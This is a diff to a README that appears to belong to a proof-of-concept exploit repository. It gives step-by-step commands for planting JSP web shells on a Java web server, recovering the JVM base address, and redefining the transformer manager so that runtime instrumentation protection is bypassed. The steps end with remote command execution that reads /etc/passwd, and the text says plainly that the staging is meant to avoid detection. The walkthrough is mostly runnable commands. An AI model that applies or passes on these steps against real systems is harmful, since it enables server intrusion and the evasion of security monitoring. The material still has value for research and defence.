@@ -13,7 +13,7 @@ We do it step by step to avoid being detected (it looks like when the request pa
    `
 ![blocked.png](blocked.png)
 8. Now deploy jvm base address backdoor: 
-`   python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="base", now you can get the base address using curl "http://localhost:8080/base.jsp" -> baseAddress`
+`   python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="readBaseAddress", now you can get the base address using curl "http://localhost:8080/readBaseAddress.jsp" -> baseAddress`
 ![base.png](base.png)
 9. Next deploy Redefine_Transformer_Manager jsp that will trigger redefining the transformerManager bytecode:
 `    python3 exploit-instrumentation-bypass.py --url="http://localhost:8080/exploit/greeting" --dir="webapps/ROOT" --file="redefineTransformer", you should the base address provided using the first step and issue  curl "http://localhost:8080/redefineTransformer.jsp?cmd={baseAddress e.g 139963791860840}” 
@@ -24,5 +24,5 @@ We do it step by step to avoid being detected (it looks like when the request pa
 `
 11. Rerun and Enjoy the bypass:
     `curl "http://localhost:8080/exploit.jsp?cmd=cat%20/etc/passwd" `
-You may need to update the base address of JvmtiEnvBase::_head_environment, first ssh in the container, find / -name libjvm.so 2>/dev/null, and finally gdb /usr/local/openjdk-11/lib/server/libjvm.so + info variables and then you have it
+You would need to update the base address of JvmtiEnvBase::_head_environment, first ssh in the container, find / -name libjvm.so 2>/dev/null, and finally gdb /usr/local/openjdk-11/lib/server/libjvm.so + info variables and then you have it
 `0x0000000000f59750  JvmtiEnvBase::_head_environment`
